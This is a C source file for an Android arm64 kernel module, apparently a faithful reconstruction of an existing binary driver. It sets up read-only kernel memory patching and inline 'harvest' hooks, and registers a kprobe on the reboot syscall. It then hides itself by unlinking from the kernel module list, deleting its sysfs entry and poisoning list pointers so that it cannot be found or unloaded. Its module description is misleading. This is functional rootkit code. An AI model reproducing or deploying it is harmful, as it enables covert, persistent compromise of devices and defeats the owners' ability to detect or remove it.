// SPDX-License-Identifier: GPL-2.0
/* module entry/exit + self-conceal. */

#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kobject.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/poison.h>
#include <linux/types.h>

#include <asm/memory.h>
#include <asm/page.h>
#include <asm/sysreg.h>

#include <driver/types.h>

#include "comm.h"
#include "harvest.h"
#include "kallsym.h"
#include "lifecycle.h"
#include "log.h"
#include "memory.h"

struct drv_state drv;

/* Initialise drv.m_page_level and drv.m_pgd_va from TCR_EL1 / TTBR1_EL1 — the
 * values the binary captures at dispatch_ioctl case 0xD1 (DRV_CMD_INSTALL_HOOKS).
 * Computed once at module init so write_ro_memory (and every hook_install path)
 * sees them populated regardless of which ioctl arrives first.
 *
 * TCR_EL1.T1SZ is bits [21:16] and controls TTBR1_EL1 (kernel-half) VA size;
 * m_page_level = (60 - T1SZ) / 9 == ceil((48 - T1SZ) / 9). For VA_BITS=39
 * (NP05J / Vivo / Android 6.6 typical) T1SZ=25 -> level_count=3 (PUD->PMD->PTE).
 * For VA_BITS=48 (other GKI configs) T1SZ=16 -> level_count=4. LPA2 / VA_BITS=52
 * yields level_count=5 and is refused at module init below; the manual PTE-flip
 * walker does not handle 5-level paging. */
static void mm_globals_init(void) {
	u64 tcr = read_sysreg(tcr_el1);
	u64 ttbr1 = read_sysreg(ttbr1_el1);
	u32 t1sz = (tcr >> 16) & 0x3Fu;
	/* Mask BADDR to the architectural maximum (CONFIG_ARM64_PA_BITS) and
	 * page-align — discards both CnP (bit 0) and ASID (high half). */
	u64 pgd_pa = ttbr1 & PHYS_MASK & PAGE_MASK;

	drv.m_page_level = (60u - t1sz) / 9u;
	drv.m_pgd_va = (u64)(uintptr_t)phys_to_virt(pgd_pa);
}

/* WARNING: touches the global modules list (mod->list) and modules_kset list (mod->mkobj.kobj.entry) without holding module_mutex / modules_kset->list_lock. The original .ko performs the same unlocked mutation; we preserve that 1:1. In practice do_init_module() runs under module_mutex on most 6.x kernels so the race is narrow, but that is not a published contract -- treat as a known on-spec hazard against concurrent insmod/rmmod. */
void conceal_module(void) {
	struct module *mod = THIS_MODULE;

	/* Unlink from the global modules list, then re-init to a self-loop. Matches the original's inlined __list_del + STR X19,[X19]/[X19,#8] sequence: any later traversal sees an empty (but valid) head rather than the LIST_POISON1/2 trap values list_del() would leave behind. */
	list_del(&mod->list);
	INIT_LIST_HEAD(&mod->list);

	/* Drop /sys/module/<name>. kobject_del() internally list_del_init's mod->mkobj.kobj.entry from modules_kset->list, leaving it self-looped. */
	kobject_del(&mod->mkobj.kobj);

	/* Re-issue list_del on the now-self-looped kobj.entry purely to stamp LIST_POISON1/2 into it -- this is what the original .ko does on the second list_head (offset 0x19270/0x19278 = &mkobj.kobj.entry) so later traversal trap-faults on the poison values. The validation in list_del passes because the self-loop satisfies entry->next->prev == entry. */
	list_del(&mod->mkobj.kobj.entry);
}

int __init init_driver(void) {
	int ret;

	pr_drv("driver_entry\n");

	/* Capture swapper_pg_dir + pagewalk depth before any hook path can run -- write_ro_memory's level_count==0 guard would silently no-op every patch otherwise. */
	mm_globals_init();

	/* Manual PTE-flip walker (memory.c:write_ro_memory_pte_flip) and every
	 * inline-hook path that depends on it support only 3- and 4-level
	 * paging. Refuse to load on LPA2 / VA_BITS=52 (level_count==5) and on
	 * any obviously-broken read. The kallsyms-resolved fast path
	 * (aarch64_insn_patch_text_nosync) does not care, but our fallback
	 * does — failing here gives userspace a hard signal instead of a
	 * "loaded but every patch is a silent no-op" state. */
	if (drv.m_page_level < 3 || drv.m_page_level > 4) {
		pr_drv_err("unsupported page level %u (need 3 or 4); aborting\n",
			   drv.m_page_level);
		return -ENOTSUPP;
	}

	/* Resolve kallsyms_lookup_name + every kallsym-shimmed function pointer that a kprobe pre-handler may need (currently just task_work_add). Done here, in process context, so the prctl/reboot pre-handlers never re-enter register_kprobe in atomic context. */
	ret = kallsym_init();
	if (ret < 0) {
		pr_drv_err("kallsym_init failed: %d\n", ret);
		return ret;
	}

	/* Resolve the kernel's text patcher (aarch64_insn_patch_text_nosync) BEFORE any hook_install path can run. Non-fatal: write_ro_memory falls back to the legacy bespoke PTE-flip on miss. */
	(void)memory_init();

	ret = comm_warm_symbols();
	if (ret < 0) {
		pr_drv_err("comm_warm_symbols failed: %d\n", ret);
		return ret;
	}

	ret = register_kprobe(&reboot_kp);
	if (ret < 0) {
		pr_drv_err("register_kprobe (__arm64_sys_reboot) failed: %d\n", ret);
		return ret;
	}

	conceal_module();
	return 0;
}

void __exit cleanup_driver(void) {
	pr_drv("driver_unload\n");

	/* conceal_module () makes us unreachable so the loader never invokes this; kept for builds that toggle conceal off. */
	uninstall_harvest_hooks();
	unregister_kprobe(&reboot_kp);
}

module_init(init_driver);
module_exit(cleanup_driver);

/* Cargo-culted namespace import preserved verbatim from the original .ko modinfo. The token does not name any namespace that exists in mainline Linux 5.4-6.12 (verified via Bootlin Elixir); MODULE_IMPORT_NS expands to a modinfo string only, so this is a no-op at build/load time, but we keep it because byte-exactness vs. the source binary is part of the spec. */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Anonymous");
MODULE_DESCRIPTION("Android kernel driver");
MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver);
